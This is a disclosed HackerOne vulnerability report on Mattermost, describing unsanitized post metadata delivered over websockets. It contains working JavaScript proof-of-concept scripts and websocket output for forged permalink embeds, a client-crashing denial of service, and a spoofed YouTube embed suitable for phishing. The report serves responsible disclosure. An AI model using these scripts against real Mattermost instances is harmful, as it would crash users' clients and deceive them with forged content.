# Posts sent via websockets aren't sanitized properly

## Report Details
- **Report ID**: 2541027
- **URL**: https://hackerone.com/reports/2541027
- **State**: Closed
- **Severity**: low
- **Submitted**: 2024-06-07T13:04:32.644Z
- **Disclosed**: 2024-10-01T12:28:41.076Z

## Reporter
- **Username**: c0rydoras
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mattermost

## Vulnerability Information
Posts aren't sanitized the same way when sent via Websockets as they are when saved to the database.


## Example 1 - Permalink embed with fully customizable content
### Code
```javascript
const MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;
const MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;
const MM_USER_ID = process.env.MM_USER_ID;
const MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post

const MM_TARGET_ID = "96nffx8oztncuyyxq7nj7p8seh"; // ID of a post, which the embed will target
const MM_SHOWN_USER_ID = "teur4prbifnh7dhq5rh3cp7q4c"; // the user shown in the embed, in this example its the userid of system

const metadata = ({
    embeds: [
      {
        type: "permalink",
        data: {
          post_id: MM_TARGET_ID,
          post: {
            id: MM_TARGET_ID,
            user_id: MM_SHOWN_USER_ID,
            channel_id: "doesnt-matter",
            root_id: "",
            original_id: "",
            message: 'This can be whatever i want',
            type: "",
            props: {},
            hashtags: "",
            reply_count: 0,
            last_reply_at: 0,
            participants: [],
            metadata: {},
          },
          team_name: "",
          channel_display_name: "can-be-anything-i-want",
          channel_type: "O",
          channel_id: "",
        },
      },
    ],
})

const body = JSON.stringify({
  file_ids: [],
  message: "",
  props: {
    previewed_post: MM_TARGET_ID,
  },
  channel_id: MM_CHANNEL_ID,
  user_id: MM_USER_ID,
  metadata,
});

const resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {
  headers: {
    "Content-Type": "application/json",
    Authorization: `Bearer ${MM_AUTH_TOKEN}`,
  },
  method: "POST",
  body,
});

console.log(JSON.stringify(await resp.json(), null, 4));
```

### Received Data from WS Connection
```json
{"event":"posted","data":{"channel_display_name":"@arthurd","channel_name":"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa","channel_type":"D","mentions":"[\"w1bycrx7apy3xn31j7dyszahfa\"]","post":"{\"id\":\"ju9uuu3xnjy1pymrp8siyk3t1o\",\"create_at\":1717763281641,\"update_at\":1717763281641,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{\"previewed_post\":\"96nffx8oztncuyyxq7nj7p8seh\"},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{\"embeds\":[{\"type\":\"permalink\",\"data\":{\"channel_display_name\":\"can-be-anything-i-want\",\"channel_id\":\"\",\"channel_type\":\"O\",\"post\":{\"channel_id\":\"doesnt-matter\",\"hashtags\":\"\",\"id\":\"96nffx8oztncuyyxq7nj7p8seh\",\"last_reply_at\":0,\"message\":\"This can be whatever i want\",\"metadata\":{},\"original_id\":\"\",\"participants\":[],\"props\":{},\"reply_count\":0,\"root_id\":\"\",\"type\":\"\",\"user_id\":\"teur4prbifnh7dhq5rh3cp7q4c\"},\"post_id\":\"96nffx8oztncuyyxq7nj7p8seh\",\"team_name\":\"\"}}]}}","sender_name":"@arthurd","set_online":true,"should_ack":true,"team_id":""},"broadcast":{"omit_users":null,"user_id":"w1bycrx7apy3xn31j7dyszahfa","channel_id":"ucatpix4girt5rp3w4xunng14o","team_id":"","connection_id":"","omit_connection_id":""},"seq":10}
```

### Resulting Post
{F3339043}

### Get request to post
```json
{"id":"ju9uuu3xnjy1pymrp8siyk3t1o","create_at":1717763281641,"update_at":1717763281641,"edit_at":0,"delete_at":0,"is_pinned":false,"user_id":"1wt8aoiskjg99dap81jx4zjejc","channel_id":"ucatpix4girt5rp3w4xunng14o","root_id":"","original_id":"","message":"","type":"","props":{"previewed_post":"96nffx8oztncuyyxq7nj7p8seh"},"hashtags":"","pending_post_id":"","reply_count":0,"last_reply_at":0,"participants":null,"metadata":{}}
```

## Example 2 - DoS via non-string message using permalink embed

### Code
```javascript
const MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;
const MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;
const MM_USER_ID = process.env.MM_USER_ID;
const MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post

const MM_TARGET_ID = "96nffx8oztncuyyxq7nj7p8seh"; // ID of a post, which the embed will target
const MM_SHOWN_USER_ID = "teur4prbifnh7dhq5rh3cp7q4c"; // the user shown in the embed, in this example its the userid of system

const metadata = ({
    embeds: [
      {
        type: "permalink",
        data: {
          post_id: MM_TARGET_ID,
          post: {
            id: MM_TARGET_ID,
            user_id: MM_SHOWN_USER_ID,
            channel_id: "doesnt-matter",
            root_id: "",
            original_id: "",
            message: ['This will crash your webapp/desktop app'],
            type: "",
            props: {},
            hashtags: "",
            reply_count: 0,
            last_reply_at: 0,
            participants: [],
            metadata: {},
          },
          team_name: "",
          channel_display_name: "can-be-anything-i-want",
          channel_type: "O",
          channel_id: "",
        },
      },
    ],
})

const body = JSON.stringify({
  file_ids: [],
  message: "",
  props: {
    previewed_post: MM_TARGET_ID,
  },
  channel_id: MM_CHANNEL_ID,
  user_id: MM_USER_ID,
  metadata,
});

const resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {
  headers: {
    "Content-Type": "application/json",
    Authorization: `Bearer ${MM_AUTH_TOKEN}`,
  },
  method: "POST",
  body,
});

console.log(JSON.stringify(await resp.json(), null, 4));
```
### Received Data from websocket connection
```json
{"event":"posted","data":{"channel_display_name":"@arthurd","channel_name":"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa","channel_type":"D","mentions":"[\"w1bycrx7apy3xn31j7dyszahfa\"]","post":"{\"id\":\"zsx67zqb8frh3knprgon4k1azc\",\"create_at\":1717763588738,\"update_at\":1717763588738,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{\"previewed_post\":\"96nffx8oztncuyyxq7nj7p8seh\"},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{\"embeds\":[{\"type\":\"permalink\",\"data\":{\"channel_display_name\":\"can-be-anything-i-want\",\"channel_id\":\"\",\"channel_type\":\"O\",\"post\":{\"channel_id\":\"doesnt-matter\",\"hashtags\":\"\",\"id\":\"96nffx8oztncuyyxq7nj7p8seh\",\"last_reply_at\":0,\"message\":[\"This will crash your webapp/desktop app\"],\"metadata\":{},\"original_id\":\"\",\"participants\":[],\"props\":{},\"reply_count\":0,\"root_id\":\"\",\"type\":\"\",\"user_id\":\"teur4prbifnh7dhq5rh3cp7q4c\"},\"post_id\":\"96nffx8oztncuyyxq7nj7p8seh\",\"team_name\":\"\"}}]}}","sender_name":"@arthurd","set_online":true,"should_ack":true,"team_id":""},"broadcast":{"omit_users":null,"user_id":"w1bycrx7apy3xn31j7dyszahfa","channel_id":"ucatpix4girt5rp3w4xunng14o","team_id":"","connection_id":"","omit_connection_id":""},"seq":14}
```

### Impact
{F3339055}
{F3339056}
(dead web application, requires restart)

Its important to note that users don't have to be on the channel where the malicious embed is, naviagting there without refreshing the website/desktopapp still ends up in a white page.

More importantly, one can send embeds with valid messages in multiple channels, then when one post changes the embed e.g. different message, that happens for all occurences, so one could create valid embeds in a couple channels e.g. town-square, off-topic and more, then one with an invalid message and all of those channels now result in a whitepage (crash) for webapp/desktopap users.

### Get request of post
```json
{"id":"zsx67zqb8frh3knprgon4k1azc","create_at":1717763588738,"update_at":1717763588738,"edit_at":0,"delete_at":0,"is_pinned":false,"user_id":"1wt8aoiskjg99dap81jx4zjejc","channel_id":"ucatpix4girt5rp3w4xunng14o","root_id":"","original_id":"","message":"","type":"","props":{"previewed_post":"96nffx8oztncuyyxq7nj7p8seh"},"hashtags":"","pending_post_id":"","reply_count":0,"last_reply_at":0,"participants":null,"metadata":{}}
```

## Example 3 - Youtube Embed with different link

### Code
```javascript
const MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;
const MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;
const MM_USER_ID = process.env.MM_USER_ID;
const MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post

const TARGET_URL = "https://github.com/c0rydoras";

const metadata = {
  embeds: [
    {
      type: "opengraph",
      url: `${TARGET_URL}?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ`,
      data: {
        type: "video.other",
        url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        title: "Rick Astley - Never Gonna Give You Up (Official Music Video)",
        description:
          "The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...",
        determiner: "",
        site_name: "YouTube",
        locale: "",
        locales_alternate: null,
        images: [
          {
            url: "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg",
            secure_url: "",
            type: "",
            width: 1280,
            height: 720,
          },
        ],
        audios: null,
        videos: null,
      },
    },
  ],
  images: {
    "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg": {
      width: 1280,
      height: 720,
      format: "jpeg",
      frame_count: 0,
    },
  },
};

const body = JSON.stringify({
  file_ids: [],
  message: "",
  channel_id: MM_CHANNEL_ID,
  user_id: MM_USER_ID,
  metadata,
});

const resp = await fetch(`${MM_INSTANCE_URL}/api/v4/posts`, {
  headers: {
    "Content-Type": "application/json",
    Authorization: `Bearer ${MM_AUTH_TOKEN}`,
  },
  method: "POST",
  body,
});

console.log(JSON.stringify(await resp.json(), null, 4));
```

### Received data from websocket connection
```json
{"event":"posted","data":{"channel_display_name":"@arthurd","channel_name":"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa","channel_type":"D","mentions":"[\"w1bycrx7apy3xn31j7dyszahfa\"]","post":"{\"id\":\"rpaioun83fds5ppf78bstpp3pw\",\"create_at\":1717764679114,\"update_at\":1717764679114,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{\"embeds\":[{\"type\":\"opengraph\",\"url\":\"https://github.com/c0rydoras?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ\",\"data\":{\"audios\":null,\"description\":\"The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...\",\"determiner\":\"\",\"images\":[{\"height\":720,\"secure_url\":\"\",\"type\":\"\",\"url\":\"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\",\"width\":1280}],\"locale\":\"\",\"locales_alternate\":null,\"site_name\":\"YouTube\",\"title\":\"Rick Astley - Never Gonna Give You Up (Official Music Video)\",\"type\":\"video.other\",\"url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\"videos\":null}}]}}","sender_name":"@arthurd","set_online":true,"should_ack":true,"team_id":""},"broadcast":{"omit_users":null,"user_id":"","channel_id":"ucatpix4girt5rp3w4xunng14o","team_id":"","connection_id":"","omit_connection_id":""},"seq":4}
```

### Rendered Post
{F3339087}
{F3339088}

The name and other values are also customizable
{F3339089}

### Get request of post
```json
{"id":"rpaioun83fds5ppf78bstpp3pw","create_at":1717764679114,"update_at":1717764679114,"edit_at":0,"delete_at":0,"is_pinned":false,"user_id":"1wt8aoiskjg99dap81jx4zjejc","channel_id":"ucatpix4girt5rp3w4xunng14o","root_id":"","original_id":"","message":"","type":"","props":{},"hashtags":"","pending_post_id":"","reply_count":0,"last_reply_at":0,"participants":null,"metadata":{}}
```

## Impact

This can be abused in several ways. Here are some I found, i'm sure theres a lot more.
- CWE-405 by having a very large payload (e.g. a lot of things in metadata), can take down server (similar to CVE\-2024-24988)
- DoS by sending  a permalink embed with a `message` that isn't a string
- Lots of ways for phishing e.g. Youtube embed that can be freely customized
- False Permalink embeds of posts that don't exist with freely customizable channel, user, time, message

## Attachments
- image.png
- image.png
- image.png
- image.png
- image.png
- image.png
